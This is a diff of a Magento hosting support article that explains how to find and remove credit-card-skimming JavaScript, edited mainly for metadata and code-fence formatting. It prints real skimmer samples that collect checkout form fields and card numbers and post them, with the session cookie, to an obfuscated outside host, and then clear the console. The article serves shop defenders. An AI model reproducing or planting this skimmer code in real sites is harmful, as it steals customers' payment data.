@@ -1,3 +1,11 @@
+---
+myst:
+  html_meta:
+    description: The hack Creditcard Hijack is malicious code in Magento that allows
+      hackers to intercept financial data. This article explains more and tells you
+      how to fix it.
+---
+
 <!-- source: https://support.hypernode.com/en/best-practices/security/how-to-fix-malicious-javascript-credit-card-hijack/ -->
 
 # How to Fix Malicious Javascript Credit Card Hijack
@@ -55,14 +63,13 @@ Search your shop for scripts similar to the ones below and remove them. Searchin
 
 The script below is an example of a minified version of the [scraper Javascript](https://blog.sucuri.net/2015/06/magento-platform-targeted-by-credit-card-scrapers.html).
 
-```nginx
-&lt;script&gt;function jj(e){var t="; "+document.cookie,o=t.split("; "+e+"=");return 2==o.length?o.pop().split(";").shift():void 0}jj("SESSIID")||(document.cookie="SESSIID="+(new Date).getTime()),jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("onepage|checkout").test(n)){for(var c=document.querySelectorAll("input, select, textarea, checkbox"),i=0;i&lt;c.length;i++)if(c[i].value.length&gt;0){var a=c[i].name;""==a&amp;&amp;(a=i),t+=a+"="+c[i].value+"&amp;"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("&lt;div /&gt;").html("&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#98;&amp;#97;&amp;#100;&amp;#46;&amp;#103;&amp;#117;&amp;#121;&amp;#47;&amp;#106;&amp;#113;&amp;#117;&amp;#101;&amp;#114;&amp;#121;&amp;#46;&amp;#112;&amp;#104;&amp;#112; ").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&amp;asd="+(l.test(t.replace(/s/g,""))?1:0)+"&amp;utmp="+n+"&amp;cookie="+jj("SESSIID")),console.clear()}}})});&lt;/script&gt;
+```javascript
+function jj(e){var t="; "+document.cookie,o=t.split("; "+e+"=");return 2==o.length?o.pop().split(";").shift():void 0}jj("SESSIID")||(document.cookie="SESSIID="+(new Date).getTime()),jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("onepage|checkout").test(n)){for(var c=document.querySelectorAll("input, select, textarea, checkbox"),i=0;i&lt;c.length;i++)if(c[i].value.length&gt;0){var a=c[i].name;""==a&amp;&amp;(a=i),t+=a+"="+c[i].value+"&amp;"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("&lt;div /&gt;").html("&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#98;&amp;#97;&amp;#100;&amp;#46;&amp;#103;&amp;#117;&amp;#121;&amp;#47;&amp;#106;&amp;#113;&amp;#117;&amp;#101;&amp;#114;&amp;#121;&amp;#46;&amp;#112;&amp;#104;&amp;#112; ").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&amp;asd="+(l.test(t.replace(/s/g,""))?1:0)+"&amp;utmp="+n+"&amp;cookie="+jj("SESSIID")),console.clear()}}})});
 ```
 
 The script below is an example of Credit Card Hijack’s malicious code. It installs the functions ‘send’ and ‘clk’, which allows hackers to collect the names and content of every common form input element, when your customer clicks a button or submits a form.
 
-```nginx
-&lt;script&gt;
+```javascript
 var snd =null;
 window.onload = function () {
  if((new RegExp('onepage')).test(window.location)) {
@@ -121,14 +128,11 @@ console.clear();
  snd=null;
  setTimeout('send()', 150);
 }
-
-&lt;/script&gt;
 ```
 
 The script below was found during the research done by Hypernode. It covers the same functionality as the script above, but is harder to spot because it’s included in a minimised form. In this script Jquery is used to add unnamed click event-handler to every button on the page. If someone clicks the button, the function is triggered and allowed to collect al input data. It checks for credit card numbers and this information is sent off to their data collection server.
 
-```nginx
-&lt;script&gt;
+```javascript
  function jj(e) {
  var t = "; " + document.cookie
  , o = t.split("; " + e + "=");
@@ -158,7 +162,6 @@ The script below was found during the research done by Hypernode. It covers the 
  }
  })
  });
-&lt;/script&gt;
 ```
 
 ## Recover Your Shop
